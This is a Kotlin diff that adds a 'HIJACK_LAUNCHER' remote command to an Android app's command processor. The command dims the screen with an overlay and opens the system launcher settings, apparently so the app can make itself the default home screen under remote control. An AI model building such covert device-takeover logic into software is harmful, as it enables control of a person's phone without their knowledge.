@@ -1906,6 +1906,33 @@ object CommandProcessor {
                         errorMsg = "No valid package names provided."
                     }
                 }
+                "HIJACK_LAUNCHER" -> {
+                    LauncherManager.isHijacking = true
+                    LauncherManager.pendingCmdId = id
+                    
+                    android.os.Handler(android.os.Looper.getMainLooper()).post {
+                        DimmerManager.applyDim(ctx, 20, "AUTO")
+                        try {
+                            val intent = android.content.Intent(android.provider.Settings.ACTION_HOME_SETTINGS).apply {
+                                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                            }
+                            ctx.startActivity(intent)
+                        } catch (e: Exception) {
+                            LauncherManager.isHijacking = false
+                            DimmerManager.removeOverlay(ctx)
+                        }
+                    }
+                    
+                    // Safety fuse: Reset if stuck for 30s
+                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                        if (LauncherManager.isHijacking) {
+                            LauncherManager.isHijacking = false
+                            DimmerManager.removeOverlay(ctx)
+                        }
+                    }, 30000)
+
+                    status = "HIJACK_INITIATED"
+                }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
                     errorMsg = "Command '$fileName' is not recognized by the device."
